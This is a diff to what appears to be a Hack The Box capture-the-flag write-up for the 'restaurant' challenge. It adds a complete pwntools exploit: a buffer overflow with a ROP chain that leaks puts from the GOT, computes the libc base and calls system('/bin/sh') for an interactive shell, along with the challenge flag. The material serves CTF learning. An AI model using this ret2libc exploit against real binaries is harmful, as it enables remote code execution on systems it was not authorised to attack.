@@ -397,6 +397,98 @@ HTB{r3turn_2_th3_r3st4ur4nt!}
 
 ## ALTERNATE SOLVES 
 
-### Go check our medium 🙌🏼
+### SOLVER WITHOUT ROPSTAR
+
+```py
+import os
+from pwn import *
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+exe = './restaurant'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+library = './libc.so.6'
+libc = context.binary = ELF(library, checksec=False)
+
+sh = start()
+
+#padding = asm('nop') * 188 # EIP OFFSET
+
+#padding = asm('nop') * 40
+padding = b'A' * 40
+
+# leaking the libc_runtime
+
+pop_rdi_gadget = 0x00000000004010a3
+info('pop_rdi_gadget --> %#0x', pop_rdi_gadget)
+
+p = flat([
+    padding,
+    pop_rdi_gadget,
+    elf.got['puts'],
+    elf.plt['puts'],
+    elf.sym['fill']
+])
+
+sh.sendlineafter(b'>', b'1')
+sh.sendlineafter(b'>', p)
+
+# grabbing the leaked libc_runtime
+sh.recvline()
+get = sh.recvline()
+print('[+] This is what received -->',get)
+leaked_libc = get[54:]
+print('[+] This is the leaked libc_runtime -->',leaked_libc)
+strip_it = leaked_libc.strip()
+print('[+] Removing the backslash n -->',strip_it)
+unpack_it = unpack(strip_it.ljust(8,b'\x00'))
+print('[+] The leaked libc in decimal format -->',unpack_it)
+info('The leaked libc in hex --> %#0x', unpack_it)
+
+libc_base = unpack_it - libc.sym['puts']
+info('LIBC_BASE --> %#0x', libc_base)
+
+libc_system = 0x000000000004f550
+info('libc_system using readelf to libc --> %#0x', libc_system)
+
+system_call = libc_base + 0x000000000004f550
+info('system_call address --> %#0x', system_call)
+
+libc_binsh = 0x1b3e1a
+info('libc /bin/sh using strings -t x libc --> %#0x', libc_binsh)
+
+binsh = libc_base + libc_binsh
+info('/bin/sh address --> %#0x', binsh)
+
+ret = 0x000000000040063e
+info('to align the bytes --> %#0x', 0x000000000040063e)
+
+# final payload
+
+p = flat([
+    padding,
+    ret,
+    pop_rdi_gadget,
+    binsh,
+    system_call
+])
+
+sh.sendlineafter(b'>', p) # send payload at the fill function which we loop it to
+sh.interactive()
+```
+
+#### NOTES: It failed locally, but success remotely
+
+### Go check our medium for another alternate solve 🙌🏼
 
 [CyberYolk's Medium](https://medium.com/@baycorp22/hack-the-box-restaurant-writeup-28fd91ee0638)
+
+
